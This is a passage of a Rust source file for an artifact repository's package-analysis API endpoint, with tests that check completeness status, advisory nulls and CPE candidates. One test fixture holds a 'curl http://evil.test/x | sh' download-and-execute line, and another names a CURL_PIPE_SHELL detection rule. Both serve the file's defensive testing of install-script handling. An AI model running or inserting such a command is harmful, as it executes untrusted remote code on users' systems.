//! Package analysis: what is actually *inside* an artifact.
//!
//! Serves the ingest-time analysis recorded by migration 221 — the native
//! libraries a conda package vendors, the install-time scripts it carries, and
//! crucially whether we managed to read the package at all (#4033).
//!
//! # Why `completeness` is not an afterthought
//!
//! Every other field here is a *finding*. `completeness` is the statement of
//! how much weight a reader may put on the absence of findings. An empty
//! `vendored_components` list means "this package vendors nothing" when the
//! status is `complete`, and means "we never opened the archive" when it is
//! `not_read` — and conflating those is the exact defect #4035/#4036 exist to
//! remove. The schema makes the distinction unforgeable (`status` is NOT NULL
//! with no default, and a CHECK requires `reason` whenever it is not
//! `complete`); this module's job is to carry it to the client without
//! flattening it.
//!
//! So: no `#[serde(default)]` on `status`, no `unwrap_or("complete")`, and no
//! "helpful" omission of the field when everything looks fine. A client that
//! cannot see the status must not be able to infer a clean bill of health.

use axum::{
    extract::{Path, State},
    routing::get,
    Extension, Json, Router,
};
use serde::Serialize;
use utoipa::{OpenApi, ToSchema};
use uuid::Uuid;

use crate::api::handlers::artifacts::check_artifact_visibility;
use crate::api::middleware::auth::AuthExtension;
use crate::api::SharedState;
use crate::error::{AppError, Result};
use crate::services::cpe_candidates;
use crate::services::package_analysis_service::{
    vendored_advisories, AdvisoryScan, ComponentAdvisory, VendoredAdvisoryReport,
};

/// Create package-analysis routes, mounted under `/api/v1/artifacts`.
pub fn router() -> Router<SharedState> {
    Router::new().route("/:id/package-analysis", get(get_package_analysis))
}

#[derive(OpenApi)]
#[openapi(
    paths(get_package_analysis),
    components(schemas(
        PackageAnalysisResponse,
        CompletenessResponse,
        VendoredComponentResponse,
        CpeCandidateResponse,
        AdvisoryResponse,
        AdvisoryScanResponse,
        InstallScriptResponse,
    ))
)]
pub struct PackageAnalysisApiDoc;

/// How much of the package we managed to read.
#[derive(Debug, Serialize, ToSchema)]
pub struct CompletenessResponse {
    /// One of `complete`, `partial`, `not_read`, `unsupported`.
    ///
    /// Never defaulted and never omitted: see the module docs.
    pub status: String,
    /// Why the read was incomplete, as a sentence a user can act on.
    ///
    /// Guaranteed non-null by a CHECK constraint whenever `status` is not
    /// `complete`.
    pub reason: Option<String>,
    pub files_total: Option<i32>,
    pub files_read: Option<i32>,
}

/// A native library compiled into the package, as declared by its recipe.
#[derive(Debug, Serialize, ToSchema)]
pub struct VendoredComponentResponse {
    pub name: String,
    pub version: Option<String>,
    pub purl: Option<String>,
    pub source_url: Option<String>,
    pub git_url: Option<String>,
    pub git_rev: Option<String>,
    pub sha256: Option<String>,
    /// `declared`, `inferred` or `unresolved`.
    ///
    /// An `unresolved` row means a template expression in the recipe could not
    /// be evaluated, so the version is unknown. It is still reported: "a source
    /// exists and we could not pin it" is materially different from "this
    /// package vendors nothing", and only one of those is good news.
    pub confidence: String,
    pub detection_method: Option<String>,
    /// `[{name, description?, source_url?}]`. Carried so a backported fix is
    /// not reported as the unpatched upstream version.
    pub applied_patches: serde_json::Value,
    /// The library's own linker name, where the packaging tool preserved it
    /// (`libwebp.so.7.1.3`). For a wheel this is the most useful single string
    /// to show a reviewer, because the file on disk has been renamed.
    pub soname: Option<String>,
    /// The ELF/libtool ABI version, kept DELIBERATELY SEPARATE from `version`.
    ///
    /// These are different numbering schemes and conflating them is actively
    /// dangerous: `libwebp.so.7` ships in libwebp 1.2.4. Reported so a reviewer
    /// can see what the binary says about itself, and never substituted for
    /// `version` -- a CVE matcher handed 7 in place of 1.2.4 matches
    /// confidently and wrongly.
    pub abi_version: Option<String>,
    /// Candidate CPEs under which this component may appear in NVD (#4043).
    ///
    /// NVD is CPE-keyed, so without these the component is discovered and
    /// then matched against nothing. The list is ALL candidates the mapping
    /// rules produced, best-first -- never a collapsed single guess, because
    /// vendor/product ambiguity is endemic in CPE (several vendors publish
    /// the same product name). Each candidate carries the `rule_id` of the
    /// mapping rule that produced it, so a wrong candidate is traceable to
    /// its rule, and a `confidence` (`high` for a curated table hit,
    /// `medium` for a source-URL-derived vendor, `low` for a name-only
    /// guess). An empty list means no rule had enough evidence -- a name
    /// too short or malformed to guess from produces no candidate rather
    /// than an invented one.
    pub cpe_candidates: Vec<CpeCandidateResponse>,
    /// True when the top-confidence tier of `cpe_candidates` holds more
    /// than one candidate.
    ///
    /// Surfaced, not resolved: nothing in the pipeline picks one of several
    /// equally-ranked guesses, so the Dependency-Track submission omits
    /// `cpe` for such a component rather than writing an arbitrary one. A
    /// reviewer seeing `true` here must disambiguate against upstream
    /// themselves.
    pub cpe_ambiguous: bool,
    /// Known advisories against this component, or `null` when nothing has
    /// asked.
    ///
    /// `null` and `[]` are different facts and clients must not conflate them,
    /// exactly as with `InstallScriptResponse::findings`. `[]` means an
    /// advisory feed was queried and knows of nothing; `null` means the
    /// question was never put, or was put and not answered. There are three
    /// ways to get `null`, and all three must render as "not a clean result":
    ///
    /// 1. No version was recovered for the component, so it is deliberately
    ///    never sent to a feed -- a version-less query matches every advisory
    ///    ever filed against the name.
    /// 2. No dependency scan has completed for this artifact. Absence of
    ///    findings before anything ran is absence of a QUESTION, not an
    ///    answer, and without this every freshly uploaded artifact would
    ///    render as clean.
    /// 3. The scan that ran was `partial` -- an advisory feed did not answer.
    ///    Its silence is not an all-clear.
    pub advisories: Option<Vec<AdvisoryResponse>>,
}

/// One candidate CPE for a vendored component, as the API exposes it.
///
/// The service type [`cpe_candidates::CpeCandidate`] is an internal value;
/// this is the published contract. `rule_id` is the mapping rule that
/// produced the candidate (`cpe-known-table-v1`, `cpe-source-url-vendor-v1`
/// or `cpe-name-as-product-v1`) — the traceability hook for a wrong guess.
#[derive(Debug, Serialize, ToSchema)]
pub struct CpeCandidateResponse {
    /// The full CPE 2.3 formatted string, e.g.
    /// `cpe:2.3:a:webmproject:libwebp:1.3.0:*:*:*:*:*:*:*`.
    pub cpe: String,
    pub vendor: String,
    pub product: String,
    /// `high`, `medium` or `low`. An open union: a client that does not
    /// recognise a value must narrow to "unknown", not to any confidence.
    pub confidence: String,
    pub rule_id: String,
}

/// One advisory against one vendored component.
///
/// `id` is required, not optional: the web client fails the parse of the whole
/// artifact on an entry without one rather than dropping it silently. That is
/// the right trade -- a list that quietly lost a row renders as a shorter,
/// cleaner list, and this endpoint exists to stop things looking cleaner than
/// they are.
#[derive(Debug, Serialize, ToSchema)]
pub struct AdvisoryResponse {
    /// `CVE-2023-4863`, a `GHSA-` id, or the feed's own identifier.
    pub id: String,
    /// `critical` / `high` / `medium` / `low` / `info`. An open union: a client
    /// that does not recognise a value renders it neutrally rather than
    /// dropping the advisory.
    pub severity: String,
    pub summary: Option<String>,
    pub url: Option<String>,
}

/// An install-time script and its static-analysis findings.
#[derive(Debug, Serialize, ToSchema)]
pub struct InstallScriptResponse {
    pub path: String,
    /// `post-link`, `pre-link`, `pre-unlink`, …
    pub kind: String,
    pub size_bytes: i64,
    pub sha256: String,
    /// False when the script was detected but its bytes could not be read.
    ///
    /// The UI renders this as "contents could not be read" rather than "no
    /// findings" — an unread script is not a safe one.
    pub content_available: bool,
    /// `[{rule_id, severity, title, description?, line?, snippet?}]`, or
    /// `null` when the script was deliberately not analysed.
    ///
    /// `null` and `[]` are different facts and clients must not conflate them:
    /// `[]` means the rules ran and matched nothing, `null` means the rules
    /// were never run because the script declares an interpreter the engine
    /// does not read. Rendering `null` as "no findings" would report an
    /// unexamined root-privileged scriptlet as clean.
    pub findings: Option<serde_json::Value>,
    /// Why analysis was skipped. Non-null exactly when `findings` is null.
    pub analysis_skipped_reason: Option<String>,
}

/// Everything we learned by reading an artifact's own bytes.
#[derive(Debug, Serialize, ToSchema)]
pub struct PackageAnalysisResponse {
    pub format: String,
    pub analyzed_at: Option<String>,
    pub completeness: CompletenessResponse,
    pub vendored_components: Vec<VendoredComponentResponse>,
    pub install_scripts: Vec<InstallScriptResponse>,
    /// Whether an advisory feed was consulted for the vendored components, and
    /// how that went. `null` when the package vendors nothing.
    ///
    /// TOP-LEVEL AND NOT PART OF `completeness`, which is a different fact
    /// wearing the same word. `completeness` is ARCHIVE-read completeness: its
    /// `partial` means the unpacker could not read the whole package, and it
    /// drives a banner counting files read. This field's `partial` means every
    /// component was found and a feed did not answer about them.
    ///
    /// Deriving one from the other fabricates whichever did not happen. A
    /// truncated archive would be relabelled an advisory-feed outage, and a
    /// feed outage on a fully-read package would render "only 40 of 40 files
    /// were read" — a banner that lies. Two failures, two fields.
    pub advisory_scan: Option<AdvisoryScanResponse>,
}

/// The advisory-feed status behind a component list.
#[derive(Debug, Serialize, ToSchema)]
pub struct AdvisoryScanResponse {
    /// `ok`, `not_run` or `partial`. An open union: a client that does not
    /// recognise a value must narrow to "unknown", asserting neither that the
    /// feed answered nor that it failed.
    ///
    /// * `ok` — feeds answered, so a component's `[]` is a real clean result.
    /// * `not_run` — no dependency scan has completed for this artifact.
    /// * `partial` — a feed was asked and did not answer.
    pub status: String,
    /// Why, as a sentence rendered to the user verbatim. Non-null exactly when
    /// `status` is not `ok`, mirroring the CHECK that governs
    /// `completeness.reason`.
    pub reason: Option<String>,
}

type AnalysisRow = (
    String,
    String,
    Option<String>,
    Option<i32>,
    Option<i32>,
    chrono::DateTime<chrono::Utc>,
);

#[allow(clippy::type_complexity)]
type ComponentRow = (
    String,
    Option<String>,
    Option<String>,
    Option<String>,
    Option<String>,
    Option<String>,
    Option<String>,
    String,
    Option<String>,
    serde_json::Value,
    Option<String>,
    Option<String>,
);

type ScriptRow = (
    String,
    String,
    i64,
    String,
    Option<String>,
    Option<serde_json::Value>,
    Option<String>,
);

/// Map one `package_vendored_components` row onto its response shape.
///
/// `advisories` is supplied by the caller rather than read here, because
/// whether a component was ever QUERIED is not a property of the component
/// row -- it depends on the artifact's scan history. See
/// [`VendoredComponentResponse::advisories`].
fn map_component(
    row: ComponentRow,
    advisories: Option<Vec<AdvisoryResponse>>,
) -> VendoredComponentResponse {
    let (
        name,
        version,
        purl,
        source_url,
        git_url,
        git_rev,
        sha256,
        confidence,
        detection_method,
        applied_patches,
        soname,
        abi_version,
    ) = row;
    // Candidate CPEs are computed from the row's own identity fields by the
    // mapping rules in `cpe_candidates` — pure, so what the API serves is
    // exactly what the Dependency-Track submission would compute for the
    // same component. All candidates go on the wire; ambiguity is a flag,
    // never a resolution.
    let cands = cpe_candidates::candidates(&cpe_candidates::ComponentIdentity {
        name: &name,
        version: version.as_deref(),
        source_url: source_url.as_deref(),
        git_url: git_url.as_deref(),
    });
    let cpe_ambiguous = cpe_candidates::is_ambiguous(&cands);
    let cpe_candidates = cands
        .into_iter()
        .map(|c| CpeCandidateResponse {
            cpe: c.cpe,
            vendor: c.vendor,
            product: c.product,
            confidence: c.confidence.as_str().to_string(),
            rule_id: c.rule_id.to_string(),
        })
        .collect();
    VendoredComponentResponse {
        name,
        version,
        purl,
        source_url,
        git_url,
        git_rev,
        sha256,
        confidence,
        detection_method,
        applied_patches,
        soname,
        abi_version,
        cpe_candidates,
        cpe_ambiguous,
        advisories,
    }
}

/// Map the service-layer feed status onto its response shape.
fn map_advisory_scan(scan: AdvisoryScan) -> AdvisoryScanResponse {
    AdvisoryScanResponse {
        status: scan.status.as_str().to_string(),
        reason: scan.reason,
    }
}

/// Map one service-layer advisory onto its response shape.
///
/// A straight field-for-field move. The types are separate because the service
/// type is an internal value and this one is a published API contract; letting
/// the two be the same struct would make any refactor of the former a silent
/// breaking change to the latter.
fn map_advisory(a: ComponentAdvisory) -> AdvisoryResponse {
    AdvisoryResponse {
        id: a.id,
        severity: a.severity,
        summary: a.summary,
        url: a.url,
    }
}

/// Map one `package_install_scripts` row onto its response shape.
///
/// The body is consumed here and deliberately NOT carried into the response:
/// it is untrusted content from the package, and the list view only needs to
/// know whether it exists. A separate endpoint can serve it on demand once
/// there is a reviewer UI that wants it. `findings` is moved across
/// unchanged, so a NULL column stays a JSON `null` rather than becoming `[]`.
fn map_script(row: ScriptRow) -> InstallScriptResponse {
    let (path, kind, size_bytes, sha256, body, findings, analysis_skipped_reason) = row;
    InstallScriptResponse {
        path,
        kind,
        size_bytes,
        sha256,
        content_available: body.is_some(),
        findings,
        analysis_skipped_reason,
    }
}

/// Assemble the response from the three query results.
///
/// Pure, and extracted from the handler on purpose: the contract in the module
/// docs -- a `status` that is never defaulted, a `findings: null` that is never
/// flattened to `[]`, a script body that never appears -- is a property of this
/// mapping, and pinning it should not require a database.
fn build_response(
    analysis: AnalysisRow,
    components: Vec<ComponentRow>,
    scripts: Vec<ScriptRow>,
    advisories: VendoredAdvisoryReport,
) -> PackageAnalysisResponse {
    let VendoredAdvisoryReport {
        scan: advisory_scan,
        components: advisories,
    } = advisories;
    // Keyed on name AND version: one package may vendor two copies of the same
    // library at different releases, and the vulnerable copy's advisory must
    // not be attached to the patched one.
    let mut by_component: std::collections::HashMap<(String, Option<String>), _> = advisories
        .into_iter()
        .map(|a| ((a.component, a.version), a.advisories))
        .collect();
    let (format, status, reason, files_total, files_read, analyzed_at) = analysis;
    PackageAnalysisResponse {
        format,
        analyzed_at: Some(analyzed_at.to_rfc3339()),
        completeness: CompletenessResponse {
            status,
            reason,
            files_total,
            files_read,
        },
        vendored_components: components
            .into_iter()
            .map(|row| {
                // `flatten` collapses two different absences into the one that
                // is safe: a component with no entry at all (nothing was
                // computed for it) is reported as not queried, never as clean.
                let advisories = by_component
                    .remove(&(row.0.clone(), row.1.clone()))
                    .flatten()
                    .map(|list| list.into_iter().map(map_advisory).collect());
                map_component(row, advisories)
            })
            .collect(),
        install_scripts: scripts.into_iter().map(map_script).collect(),
        advisory_scan: advisory_scan.map(map_advisory_scan),
    }
}

/// Get the package analysis for an artifact.
///
/// Returns 404 when no analysis has been recorded, which the web client
/// normalizes to a "not analyzed" state. That is deliberately distinct from a
/// 200 carrying `status: "not_read"`: the first means we never ran, the second
/// means we ran and could not read the bytes.
#[utoipa::path(
    get,
    path = "/{id}/package-analysis",
    context_path = "/api/v1/artifacts",
    tag = "artifacts",
    params(("id" = Uuid, Path, description = "Artifact ID")),
    security(("bearer_auth" = [])),
    responses(
        (status = 200, description = "Analysis retrieved", body = PackageAnalysisResponse),
        (status = 401, description = "Authentication required"),
        (status = 403, description = "Not permitted to read this artifact"),
        (status = 404, description = "Artifact not found, or not analyzed"),
    )
)]
async fn get_package_analysis(
    State(state): State<SharedState>,
    Extension(auth): Extension<Option<AuthExtension>>,
    Path(id): Path<Uuid>,
) -> Result<Json<PackageAnalysisResponse>> {
    // Authentication FIRST, unconditionally — `check_artifact_visibility`
    // short-circuits Ok for a public repository, so checking visibility first
    // would make this anonymously readable on exactly the repositories with
    // the widest audience (the shape behind GHSA-ww52-pmcg-f53c).
    //
    // This endpoint returns install-script *bodies*, which are attacker-
    // controlled content from an untrusted package. Serving them without a
    // read gate would hand an anonymous caller a convenient way to stage
    // content under a trusted origin.
    let auth =
        auth.ok_or_else(|| AppError::Authentication("Authentication required".to_string()))?;
    check_artifact_visibility(&Some(auth), id, &state.db, "read").await?;

    let db = &state.db;

    // `check_artifact_visibility` returns Ok when the artifact does not exist
    // (it documents that the upstream query will 404), so absence of an
    // analysis row and absence of the artifact both land here as 404.
    let analysis: Option<AnalysisRow> = sqlx::query_as(
        "SELECT format, status, reason, files_total, files_read, analyzed_at \
         FROM package_analysis WHERE artifact_id = $1",
    )
    .bind(id)
    .fetch_optional(db)
    .await
    .map_err(|e| AppError::Database(e.to_string()))?;

    let Some(analysis) = analysis else {
        return Err(AppError::NotFound(
            "No package analysis recorded for this artifact".to_string(),
        ));
    };

    let components: Vec<ComponentRow> = sqlx::query_as(
        "SELECT name, version, purl, source_url, git_url, git_rev, sha256, \
                confidence, detection_method, applied_patches, soname, \
                abi_version \
         FROM package_vendored_components WHERE artifact_id = $1 \
         ORDER BY name, version NULLS FIRST",
    )
    .bind(id)
    .fetch_all(db)
    .await
    .map_err(|e| AppError::Database(e.to_string()))?;

    let scripts: Vec<ScriptRow> = sqlx::query_as(
        "SELECT path, kind, size_bytes, sha256, body, findings, \
                analysis_skipped_reason \
         FROM package_install_scripts WHERE artifact_id = $1 ORDER BY path",
    )
    .bind(id)
    .fetch_all(db)
    .await
    .map_err(|e| AppError::Database(e.to_string()))?;

    // Which components were asked about, and what came back. Loaded through
    // the service so the rule about what an empty list is allowed to mean
    // lives next to the scanner that writes the findings, not here.
    let advisories = vendored_advisories(db, id).await?;

    Ok(Json(build_response(
        analysis, components, scripts, advisories,
    )))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::api::handlers::test_db_helpers as tdh;
    use crate::services::package_analysis_service::ComponentAdvisories;
    use serde_json::json;

    // -----------------------------------------------------------------------
    // Row fixtures. These build the tuples the queries return, so the tests
    // below exercise the REAL mapping rather than a hand-built response.
    // -----------------------------------------------------------------------

    fn analysis_row(status: &str, reason: Option<&str>) -> AnalysisRow {
        (
            "conda".to_string(),
            status.to_string(),
            reason.map(str::to_string),
            Some(120),
            Some(118),
            chrono::DateTime::parse_from_rfc3339("2026-09-19T12:00:00Z")
                .expect("fixed timestamp")
                .with_timezone(&chrono::Utc),
        )
    }

    fn component_row(name: &str, version: Option<&str>, confidence: &str) -> ComponentRow {
        (
            name.to_string(),
            version.map(str::to_string),
            version.map(|v| format!("pkg:generic/{name}@{v}")),
            Some("https://example.test/src.tar.gz".to_string()),
            None,
            None,
            Some("f00d".to_string()),
            confidence.to_string(),
            Some("recipe".to_string()),
            json!([{ "name": "CVE-2023-4863.patch" }]),
            Some(format!("{name}.so.7.1.3")),
            Some("7".to_string()),
        )
    }

    fn script_row(
        path: &str,
        body: Option<&str>,
        findings: Option<serde_json::Value>,
        skipped: Option<&str>,
    ) -> ScriptRow {
        (
            path.to_string(),
            "post-link".to_string(),
            42,
            "abc123".to_string(),
            body.map(str::to_string),
            findings,
            skipped.map(str::to_string),
        )
    }

    /// Serialize as axum would, so the assertions are about the bytes a client
    /// sees rather than the Rust struct behind them.
    fn wire(response: &PackageAnalysisResponse) -> serde_json::Value {
        serde_json::to_value(response).expect("serialize response")
    }

    // -----------------------------------------------------------------------
    // completeness.status: never defaulted, never omitted
    // -----------------------------------------------------------------------

    /// Every status the schema allows must reach the client verbatim. A reader
    /// that cannot tell `not_read` from `complete` cannot tell "we found
    /// nothing" from "we never looked", which is the defect this endpoint
    /// exists to remove.
    #[test]
    fn every_completeness_status_is_carried_verbatim() {
        for (status, reason) in [
            ("complete", None),
            ("partial", Some("extraction ceiling reached")),
            ("not_read", Some("archive could not be opened")),
            ("unsupported", Some("no reader for this format")),
        ] {
            let response = build_response(
                analysis_row(status, reason),
                vec![],
                vec![],
                no_advisories(),
            );
            let json = wire(&response);
            assert_eq!(
                json["completeness"]["status"],
                json!(status),
                "status must be carried verbatim, got {json}"
            );
            assert_eq!(
                json["completeness"]["reason"],
                match reason {
                    Some(r) => json!(r),
                    None => serde_json::Value::Null,
                },
                "reason must travel with the status it explains, got {json}"
            );
        }
    }

    /// The clean case is the dangerous one to omit: a client that receives no
    /// `status` key must not be able to read the absence as a clean bill of
    /// health. No `skip_serializing_if`, no default, no elision.
    #[test]
    fn completeness_status_key_is_present_even_when_complete() {
        let json = wire(&build_response(
            analysis_row("complete", None),
            vec![],
            vec![],
            no_advisories(),
        ));
        let completeness = json["completeness"]
            .as_object()
            .expect("completeness must be an object");
        assert!(
            completeness.contains_key("status"),
            "the status key must always be emitted, got {json}"
        );
        assert!(
            completeness.contains_key("reason"),
            "reason must be emitted as explicit null, not elided, got {json}"
        );
        assert_eq!(json["completeness"]["files_total"], json!(120));
        assert_eq!(json["completeness"]["files_read"], json!(118));
        assert_eq!(json["format"], json!("conda"));
        assert_eq!(json["analyzed_at"], json!("2026-09-19T12:00:00+00:00"));
    }

    /// An analyzed package that vendors nothing and ships no scripts must
    /// serialize empty ARRAYS. Null here would be a third state clients would
    /// have to guess at, and `completeness` is the only place the "we did not
    /// look" fact belongs.
    #[test]
    fn empty_component_and_script_lists_serialize_as_arrays() {
        let json = wire(&build_response(
            analysis_row("complete", None),
            vec![],
            vec![],
            no_advisories(),
        ));
        assert_eq!(json["vendored_components"], json!([]));
        assert_eq!(json["install_scripts"], json!([]));
    }

    // -----------------------------------------------------------------------
    // findings: null is not []
    // -----------------------------------------------------------------------

    /// `[]` means the rules ran and matched nothing; `null` means they were
    /// never run. Rendering the second as the first reports an unexamined
    /// root-privileged scriptlet as clean, so `null` must survive
    /// serialization as JSON null and must not be coerced to an empty array.
    #[test]
    fn null_findings_survive_as_null_and_are_distinct_from_empty() {
        let response = build_response(
            analysis_row("complete", None),
            vec![],
            vec![
                script_row("a-unexamined.sh", Some("#!/usr/bin/lua"), None, Some("lua")),
                script_row("b-examined.sh", Some("#!/bin/sh"), Some(json!([])), None),
            ],
            no_advisories(),
        );
        let json = wire(&response);
        let unexamined = &json["install_scripts"][0];
        let examined = &json["install_scripts"][1];

        assert!(
            unexamined["findings"].is_null(),
            "unanalysed findings must stay null, got {unexamined}"
        );
        assert!(
            !unexamined["findings"].is_array(),
            "null findings must not be coerced to an array, got {unexamined}"
        );
        assert_eq!(
            unexamined["analysis_skipped_reason"],
            json!("lua"),
            "the skip reason must travel with the null, got {unexamined}"
        );
        assert_eq!(
            examined["findings"],
            json!([]),
            "rules that ran and matched nothing must serialize as [], got {examined}"
        );
        assert_ne!(
            unexamined["findings"], examined["findings"],
            "an unexamined script must not serialize identically to a clean one"
        );
        assert!(
            examined["analysis_skipped_reason"].is_null(),
            "a script that WAS analysed carries no skip reason, got {examined}"
        );
    }

    /// Findings that did match are carried through unflattened, so the UI can
    /// render rule id, severity and line.
    #[test]
    fn matched_findings_are_carried_through_unchanged() {
        let finding = json!([{
            "rule_id": "CURL_PIPE_SHELL",
            "severity": "high",
            "title": "downloads and executes a remote script",
            "line": 3,
        }]);
        let json = wire(&build_response(
            analysis_row("complete", None),
            vec![],
            vec![script_row(
                "post-link.sh",
                Some("#!/bin/sh"),
                Some(finding.clone()),
                None,
            )],
            no_advisories(),
        ));
        assert_eq!(json["install_scripts"][0]["findings"], finding);
    }

    // -----------------------------------------------------------------------
    // script bodies are never serialized
    // -----------------------------------------------------------------------

    /// The body is attacker-controlled content from an untrusted package. The
    /// response says only WHETHER it is available; serving it here would hand
    /// a caller a way to stage content under a trusted origin.
    #[test]
    fn script_bodies_are_never_serialized_only_their_availability() {
        let secret = "curl http://evil.test/x | sh";
        let response = build_response(
            analysis_row("complete", None),
            vec![],
            vec![
                script_row("a-readable.sh", Some(secret), Some(json!([])), None),
                script_row("b-unreadable.sh", None, Some(json!([])), None),
            ],
            no_advisories(),
        );
        let json = wire(&response);
        let readable = json["install_scripts"][0]
            .as_object()
            .expect("script object");

        assert!(
            !readable.contains_key("body"),
            "the script body must not be a response field, got {json}"
        );
        assert_eq!(
            readable["content_available"],
            json!(true),
            "a readable body must report content_available: true, got {json}"
        );
        assert_eq!(
            json["install_scripts"][1]["content_available"],
            json!(false),
            "a NULL body means detected-but-unreadable, not absent, got {json}"
        );
        assert!(
            !serde_json::to_string(&response)
                .expect("serialize")
                .contains("evil.test"),
            "no fragment of the body may appear anywhere in the response"
        );
        // The non-secret facts about the same script are still reported.
        assert_eq!(readable["path"], json!("a-readable.sh"));
        assert_eq!(readable["kind"], json!("post-link"));
        assert_eq!(readable["size_bytes"], json!(42));
        assert_eq!(readable["sha256"], json!("abc123"));
    }

    // -----------------------------------------------------------------------
    // vendored components
    // -----------------------------------------------------------------------

    /// An `unresolved` row means "a source exists and we could not pin it",
    /// which is materially different from "this package vendors nothing". It
    /// is reported with every field it does have, and a null version rather
    /// than a guessed one.
    #[test]
    fn unresolved_components_are_reported_with_a_null_version() {
        let json = wire(&build_response(
            analysis_row("partial", Some("template expression unevaluated")),
            vec![
                component_row("libwebp", Some("1.3.2"), "declared"),
                component_row("zlib", None, "unresolved"),
            ],
            vec![],
            no_advisories(),
        ));
        let declared = &json["vendored_components"][0];
        let unresolved = &json["vendored_components"][1];

        assert_eq!(declared["name"], json!("libwebp"));
        assert_eq!(declared["version"], json!("1.3.2"));
        assert_eq!(declared["purl"], json!("pkg:generic/libwebp@1.3.2"));
        assert_eq!(declared["confidence"], json!("declared"));
        assert_eq!(declared["detection_method"], json!("recipe"));
        assert_eq!(declared["sha256"], json!("f00d"));
        assert_eq!(
            declared["applied_patches"],
            json!([{ "name": "CVE-2023-4863.patch" }]),
            "patches must travel with the component so a backported fix is not \
             reported as the unpatched upstream version, got {declared}"
        );
        assert_eq!(unresolved["confidence"], json!("unresolved"));
        assert!(
            unresolved["version"].is_null(),
            "an unpinnable version must stay null, not be guessed, got {unresolved}"
        );
        assert!(unresolved["purl"].is_null());
        assert!(unresolved["git_url"].is_null());
        assert!(unresolved["git_rev"].is_null());

        // #4043: both columns have existed in the schema since migration 222
        // and reached no client until now.
        assert_eq!(
            declared["soname"],
            json!("libwebp.so.7.1.3"),
            "the linker name is the most useful single string for a reviewer \
             looking at a wheel, where the file on disk has been renamed, got \
             {declared}"
        );
        assert_eq!(
            declared["abi_version"],
            json!("7"),
            "the ABI version is reported ALONGSIDE the release version, never \
             folded into it: `libwebp.so.7` ships in libwebp 1.2.4, and a \
             matcher handed 7 in place of 1.2.4 matches wrongly, got {declared}"
        );
        assert_ne!(
            declared["abi_version"], declared["version"],
            "the two numbering schemes must stay visibly distinct"
        );
    }

    // -----------------------------------------------------------------------
    // cpe_candidates: all candidates, with rules and confidences (#4043)
    // -----------------------------------------------------------------------

    /// A vendored library with a curated table entry arrives with exactly
    /// one candidate -- vendor and product as NVD keys them -- and is NOT
    /// flagged ambiguous. This is the identity that lets NVD matching say
    /// anything about the component at all.
    #[test]
    fn known_library_carries_its_curated_cpe_candidate() {
        let json = wire(&build_response(
            analysis_row("complete", None),
            vec![component_row("libwebp", Some("1.3.0"), "declared")],
            vec![],
            no_advisories(),
        ));
        let component = &json["vendored_components"][0];

        assert_eq!(
            component["cpe_candidates"],
            json!([{
                "cpe": "cpe:2.3:a:webmproject:libwebp:1.3.0:*:*:*:*:*:*:*",
                "vendor": "webmproject",
                "product": "libwebp",
                "confidence": "high",
                "rule_id": "cpe-known-table-v1",
            }]),
            "the curated identity must arrive verbatim, got {component}"
        );
        assert_eq!(component["cpe_ambiguous"], json!(false));
    }

    /// Mutation check on the ambiguity flag (#4088 lesson): the SAME
    /// response carries a known library (ambiguous = false) and an unknown
    /// name (ambiguous = true), so collapsing either direction of the flag
    /// -- always-true, always-false, inverted -- fails this test. The
    /// unknown name keeps BOTH vendor spellings; nothing picks one.
    #[test]
    fn ambiguous_name_carries_every_candidate_and_the_flag() {
        let json = wire(&build_response(
            analysis_row("complete", None),
            vec![
                component_row("libwebp", Some("1.3.0"), "declared"),
                component_row("somecodec", Some("2.0"), "declared"),
            ],
            vec![],
            no_advisories(),
        ));
        let known = &json["vendored_components"][0];
        let unknown = &json["vendored_components"][1];

        assert_eq!(known["cpe_ambiguous"], json!(false));
        assert_eq!(unknown["cpe_ambiguous"], json!(true));

        let cands = unknown["cpe_candidates"]
            .as_array()
            .expect("candidates array");
        assert_eq!(
            cands.len(),
            2,
            "both vendor spellings must survive: {unknown}"
        );
        let vendors: Vec<&str> = cands
            .iter()
            .map(|c| c["vendor"].as_str().expect("vendor"))
            .collect();
        assert!(vendors.contains(&"somecodec"), "got {unknown}");
        assert!(vendors.contains(&"somecodec_project"), "got {unknown}");
        for c in cands {
            // Every candidate is traceable to the rule that guessed it.
            assert_eq!(c["rule_id"], json!("cpe-name-as-product-v1"));
            assert_eq!(c["confidence"], json!("low"));
            assert_eq!(c["product"], json!("somecodec"));
        }
    }

    /// The confidence floor on the wire: a name too malformed to be a real
    /// upstream product arrives with an EMPTY candidate list -- the empty
    /// list is the honest "unmappable", and inventing a CPE for it would
    /// match a different project's advisories.
    #[test]
    fn unmappable_name_carries_no_candidates() {
        let json = wire(&build_response(
            analysis_row("complete", None),
            vec![component_row("{{ name }}", Some("1.0"), "unresolved")],
            vec![],
            no_advisories(),
        ));
        let component = &json["vendored_components"][0];
        assert_eq!(component["cpe_candidates"], json!([]));
        assert_eq!(
            component["cpe_ambiguous"],
            json!(false),
            "an unmappable component is unanswered, not ambiguous, got {component}"
        );
    }

    /// The fixture's `source_url` is not a forge URL, so the medium rule
    /// stays silent here; when the row DOES carry a forge URL the derived
    /// vendor outranks the name guesses and the set is not ambiguous.
    #[test]
    fn forge_source_url_derives_the_vendor_at_medium_confidence() {
        let mut row = component_row("somecodec", Some("2.0"), "declared");
        row.3 = Some("https://github.com/acme/somecodec".to_string());
        let json = wire(&build_response(
            analysis_row("complete", None),
            vec![row],
            vec![],
            no_advisories(),
        ));
        let component = &json["vendored_components"][0];
        assert_eq!(component["cpe_ambiguous"], json!(false));
        assert_eq!(
            component["cpe_candidates"][0],
            json!({
                "cpe": "cpe:2.3:a:acme:somecodec:2.0:*:*:*:*:*:*:*",
                "vendor": "acme",
                "product": "somecodec",
                "confidence": "medium",
                "rule_id": "cpe-source-url-vendor-v1",
            }),
            "the URL-derived candidate sorts first, got {component}"
        );
        // The low guesses are still carried as provenance, not collapsed.
        assert_eq!(
            component["cpe_candidates"].as_array().expect("array").len(),
            3,
            "the name guesses stay attached below the evidence, got {component}"
        );
    }

    // -----------------------------------------------------------------------
    // advisories: null is not []
    // -----------------------------------------------------------------------

    /// An advisory report that says nothing at all: no feed status, no
    /// per-component state. Every component then reports `advisories: null`,
    /// which is the safe default and is itself pinned below.
    fn no_advisories() -> VendoredAdvisoryReport {
        VendoredAdvisoryReport {
            scan: None,
            components: vec![],
        }
    }

    fn report(scan: AdvisoryScan, components: Vec<ComponentAdvisories>) -> VendoredAdvisoryReport {
        VendoredAdvisoryReport {
            scan: Some(scan),
            components,
        }
    }

    fn advisories_for(
        name: &str,
        version: Option<&str>,
        advisories: Option<Vec<ComponentAdvisory>>,
    ) -> ComponentAdvisories {
